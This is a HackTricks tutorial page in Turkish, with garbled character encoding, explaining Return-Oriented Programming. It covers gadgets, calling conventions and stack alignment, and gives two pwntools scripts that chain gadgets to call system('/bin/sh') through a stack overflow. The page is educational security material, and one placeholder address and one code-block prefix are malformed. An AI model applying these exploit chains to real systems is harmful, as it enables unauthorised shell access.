# ROP - Return Oriented Programing

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek destek olun.

</details>

## **Temel Bilgiler**

**Return-Oriented Programming (ROP)**, **No-Execute (NX)** veya **Data Execution Prevention (DEP)** gibi gÃ¼venlik Ã¶nlemlerini atlatmak iÃ§in kullanÄ±lan geliÅŸmiÅŸ bir sÄ±zma tekniÄŸidir. Bir saldÄ±rgan, shellcode enjekte etmek ve yÃ¼rÃ¼tmek yerine, binary veya yÃ¼klenmiÅŸ kÃ¼tÃ¼phanelerde zaten bulunan kod parÃ§alarÄ±nÄ±, yani **"gadget"**'larÄ± kullanÄ±r. Her gadget genellikle bir `ret` talimatÄ± ile biter ve veri taÅŸÄ±ma veya aritmetik iÅŸlemler gibi kÃ¼Ã§Ã¼k bir iÅŸlem gerÃ§ekleÅŸtirir. Bu gadget'larÄ± bir araya getirerek, bir saldÄ±rgan, NX/DEP korumalarÄ±nÄ± atlayarak keyfi iÅŸlemler gerÃ§ekleÅŸtirmek iÃ§in bir yÃ¼k oluÅŸturabilir.

### ROP NasÄ±l Ã‡alÄ±ÅŸÄ±r

1. **Kontrol AkÄ±ÅŸÄ± KaÃ§Ä±rma**: Ä°lk olarak, bir saldÄ±rganÄ±n bir programÄ±n kontrol akÄ±ÅŸÄ±nÄ± ele geÃ§irmesi gerekir, genellikle bir tampon taÅŸmasÄ± kullanarak yÄ±ÄŸÄ±nda kaydedilmiÅŸ bir dÃ¶nÃ¼ÅŸ adresini Ã¼zerine yazarak.
2. **Gadget Zinciri**: SaldÄ±rgan daha sonra istenen iÅŸlemleri gerÃ§ekleÅŸtirmek iÃ§in dikkatlice gadget'larÄ± seÃ§er ve zincirler. Bu, bir iÅŸlev Ã§aÄŸrÄ±sÄ± iÃ§in argÃ¼manlarÄ± ayarlamayÄ±, iÅŸlevi Ã§aÄŸÄ±rmayÄ± (Ã¶rneÄŸin, `system("/bin/sh")`), ve gerekli temizlik veya ek iÅŸlemleri ele almayÄ± iÃ§erebilir.
3. **YÃ¼k YÃ¼rÃ¼tme**: ZayÄ±f iÅŸlev geri dÃ¶ndÃ¼ÄŸÃ¼nde, meÅŸru bir konuma dÃ¶nÃ¼ÅŸ yapmak yerine, gadget zincirini yÃ¼rÃ¼tmeye baÅŸlar.

## ROP Zinciri x86 Ã–rneÄŸi

### **x86 (32-bit) Ã‡aÄŸrÄ± sÃ¶zleÅŸmeleri**

* **cdecl**: Ã‡aÄŸrÄ± yapan yÄ±ÄŸÄ±nÄ± temizler. Ä°ÅŸlev argÃ¼manlarÄ± yÄ±ÄŸÄ±na ters sÄ±rayla itilir (saÄŸdan sola). **ArgÃ¼manlar saÄŸdan sola doÄŸru yÄ±ÄŸÄ±na itilir.**
* **stdcall**: cdecl'ye benzer, ancak yÄ±ÄŸÄ±nÄ± temizleme iÅŸlemi Ã§aÄŸrÄ±yÄ± alanÄ±n sorumluluÄŸundadÄ±r.

### **Gadget'lar Bulma**

Ã–ncelikle, binary veya yÃ¼klenmiÅŸ kÃ¼tÃ¼phanelerde gerekli gadget'larÄ± tanÄ±mladÄ±ÄŸÄ±mÄ±zÄ± varsayalÄ±m. Ä°lgilendiÄŸimiz gadget'lar ÅŸunlardÄ±r:

* `pop eax; ret`: Bu gadget, yÄ±ÄŸÄ±nÄ±n en Ã¼st deÄŸerini `EAX` kaydedicisine iter ve ardÄ±ndan dÃ¶ner, bÃ¶ylece `EAX` Ã¼zerinde kontrol saÄŸlar.
* `pop ebx; ret`: YukarÄ±dakiyle benzer, ancak `EBX` kaydedicisi iÃ§in, `EBX` Ã¼zerinde kontrol saÄŸlar.
* `mov [ebx], eax; ret`: `EAX` iÃ§indeki deÄŸeri `EBX` tarafÄ±ndan iÅŸaret edilen bellek konumuna taÅŸÄ±r ve ardÄ±ndan dÃ¶ner.
* AyrÄ±ca, `system()` iÅŸlevinin adresine sahibiz.

### **ROP Zinciri**

**pwntools** kullanarak, ROP zinciri yÃ¼rÃ¼tmesi iÃ§in yÄ±ÄŸÄ±nÄ± aÅŸaÄŸÄ±daki gibi hazÄ±rlÄ±yoruz, `system('/bin/sh')`'yi yÃ¼rÃ¼tmeyi amaÃ§layarak, zincirin aÅŸaÄŸÄ±daki gibi baÅŸladÄ±ÄŸÄ±na dikkat edin:

1. Hizalama amaÃ§lÄ± bir `ret` talimatÄ± (isteÄŸe baÄŸlÄ±)
2. `system` iÅŸlevinin adresi (ASLR devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ ve bilinen libc varsayÄ±larak, daha fazla bilgi iÃ§in [**Ret2lib**](ret2lib/))
3. `system()`'dan dÃ¶nÃ¼ÅŸ adresi iÃ§in yer tutucu
4. `"/bin/sh"` dizesi adresi (system iÅŸlevi iÃ§in parametre)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadcode

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## x64 Ã–rneÄŸinde ROP Zinciri

### **x64 (64-bit) Ã‡aÄŸrÄ± KurallarÄ±**

* Unix benzeri sistemlerde **System V AMD64 ABI** Ã§aÄŸrÄ± kuralÄ±nÄ± kullanÄ±r, burada **ilk altÄ± tamsayÄ± veya iÅŸaretÃ§i argÃ¼man `RDI`, `RSI`, `RDX`, `RCX`, `R8` ve `R9` register'larÄ±na geÃ§irilir**. Ek argÃ¼manlar yÄ±ÄŸÄ±na geÃ§irilir. DÃ¶nÃ¼ÅŸ deÄŸeri `RAX` register'Ä±na yerleÅŸtirilir.
* **Windows x64** Ã§aÄŸrÄ± kuralÄ±, ilk dÃ¶rt tamsayÄ± veya iÅŸaretÃ§i argÃ¼man iÃ§in `RCX`, `RDX`, `R8` ve `R9`'u kullanÄ±r, ek argÃ¼manlar yÄ±ÄŸÄ±na geÃ§irilir. DÃ¶nÃ¼ÅŸ deÄŸeri `RAX` register'Ä±na yerleÅŸtirilir.
* **Register'lar**: 64-bit register'lar `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` ve `R8` ile `R15`'i iÃ§erir.

#### **Gadget'lar Bulma**

AmacÄ±mÄ±z, **RDI** register'Ä±nÄ± ayarlamamÄ±za ( **system()**'a **"/bin/sh"** dizesini bir argÃ¼man olarak geÃ§irmek iÃ§in) ve ardÄ±ndan **system()** fonksiyonunu Ã§aÄŸÄ±rmamÄ±za izin verecek gadget'larÄ± bulmaya odaklanalÄ±m. AÅŸaÄŸÄ±daki gadget'larÄ± tanÄ±mladÄ±ÄŸÄ±mÄ±zÄ± varsayalÄ±m:

* **pop rdi; ret**: YÄ±ÄŸÄ±nÄ±n en Ã¼st deÄŸerini **RDI**'a Ã§Ä±karÄ±r ve ardÄ±ndan dÃ¶ner. **system()** iÃ§in argÃ¼manÄ±mÄ±zÄ± ayarlamak iÃ§in temel Ã¶nemdedir.
* **ret**: Basit bir dÃ¶nÃ¼ÅŸ, bazÄ± senaryolarda yÄ±ÄŸÄ±n hizalamasÄ± iÃ§in kullanÄ±ÅŸlÄ±dÄ±r.

Ve **system()** fonksiyonunun adresini biliyoruz.

### **ROP Zinciri**

AÅŸaÄŸÄ±da, **system('/bin/sh')**'yi Ã§alÄ±ÅŸtÄ±rmayÄ± amaÃ§layan bir ROP zinciri oluÅŸturmak ve yÃ¼rÃ¼tmek iÃ§in **pwntools** kullanarak bir Ã¶rnek bulunmaktadÄ±r:
```python
pythonCopy codefrom pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
### YÄ±ÄŸÄ±n HizalamasÄ±

**x86-64 ABI**, bir **Ã§aÄŸrÄ± talimatÄ±** yÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼nde **yÄ±ÄŸÄ±nÄ±n 16 bayt hizalandÄ±ÄŸÄ±nÄ±** saÄŸlar. **LIBC**, performansÄ± optimize etmek iÃ§in **SSE talimatlarÄ±** (Ã¶rneÄŸin **movaps**) kullanÄ±r ve bu hizalamayÄ± gerektirir. EÄŸer yÄ±ÄŸÄ±n dÃ¼zgÃ¼n hizalanmamÄ±ÅŸsa (yani **RSP** 16'nÄ±n katÄ± deÄŸilse), **system** gibi fonksiyonlara yapÄ±lan Ã§aÄŸrÄ±lar bir **ROP zincirinde** baÅŸarÄ±sÄ±z olacaktÄ±r. Bunun dÃ¼zeltilmesi iÃ§in, ROP zincirinizde **system**'i Ã§aÄŸÄ±rmadan Ã¶nce bir **ret gadget** ekleyin.

## x86 ve x64 Ana FarkÄ±

{% hint style="success" %}
x64, ilk birkaÃ§ argÃ¼man iÃ§in kayÄ±tlarÄ± kullandÄ±ÄŸÄ±ndan, basit fonksiyon Ã§aÄŸrÄ±larÄ± iÃ§in genellikle x86'dan daha az gadget gerektirir, ancak doÄŸru gadget'larÄ± bulup zincirlemek, artan kayÄ±t sayÄ±sÄ± ve daha bÃ¼yÃ¼k adres alanÄ± nedeniyle daha karmaÅŸÄ±k olabilir. **x64** mimarisinde artan kayÄ±t sayÄ±sÄ± ve daha bÃ¼yÃ¼k adres alanÄ±, Ã¶zellikle Return-Oriented Programming (ROP) baÄŸlamÄ±nda, hem fÄ±rsatlar hem de zorluklar sunar.
{% endhint %}

## ROP'a KarÅŸÄ± Korumalar

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **ve** [**PIE**](../common-binary-protections-and-bypasses/pie/): Bu korumalar, gadget'larÄ±n adreslerinin yÃ¼rÃ¼tme arasÄ±nda deÄŸiÅŸmesini zorlaÅŸtÄ±rarak ROP'un kullanÄ±mÄ±nÄ± zorlaÅŸtÄ±rÄ±r.
* [**YÄ±ÄŸÄ±n KanaryalarÄ±**](../common-binary-protections-and-bypasses/stack-canaries/): BOF durumunda, ROP zincirini kÃ¶tÃ¼ye kullanmak iÃ§in geri dÃ¶nÃ¼ÅŸ iÅŸaretÃ§ilerini Ã¼zerine yazmak iÃ§in yÄ±ÄŸÄ±n kanaryasÄ±nÄ± atlamak gereklidir.
* **Yetersiz Gadget'lar**: Yeterli gadget yoksa ROP zinciri oluÅŸturulamaz.

## ROP tabanlÄ± teknikler

ROP'un sadece keyfi kodu yÃ¼rÃ¼tmek iÃ§in bir teknik olduÄŸunu unutmayÄ±n. ROP'a dayalÄ± birÃ§ok Ret2XXX tekniÄŸi geliÅŸtirilmiÅŸtir:

* **Ret2lib**: YÃ¼klenmiÅŸ bir kÃ¼tÃ¼phaneden keyfi parametrelerle keyfi fonksiyonlarÄ± Ã§aÄŸÄ±rmak iÃ§in ROP'u kullanÄ±n (genellikle `system('/bin/sh')` gibi bir ÅŸey).

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Bir sistem Ã§aÄŸrÄ±sÄ±nÄ± hazÄ±rlamak iÃ§in ROP'u kullanÄ±n, Ã¶rneÄŸin `execve`, ve bunu keyfi komutlarÄ± yÃ¼rÃ¼tmek iÃ§in kullanÄ±n.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret ve EBP Zincirleme**: Ä°lk olarak akÄ±ÅŸÄ± kontrol etmek iÃ§in EBP'yi EIP yerine kÃ¶tÃ¼ye kullanacak ve ikincisi Ret2lib'e benzer ancak akÄ±ÅŸÄ± genellikle EBP adresleriyle kontrol eder (ancak EIP'nin de kontrol edilmesi gerekmektedir).

{% content-ref url="../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

## DiÄŸer Ã–rnekler ve Referanslar

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html)
* 64 bit, Pie ve nx etkin, kanarya olmayan, `vsyscall` adresi ile RIP'yi Ã¼zerine yazarak flag sÄ±zdÄ±ran fonksiyonun bir kÄ±smÄ±nÄ± elde etmek iÃ§in yÄ±ÄŸÄ±nÄ±n bir sonraki adresine geri dÃ¶nmek amacÄ±yla bir kÄ±smi Ã¼zerine yazma iÅŸlemi yapÄ±lacak.
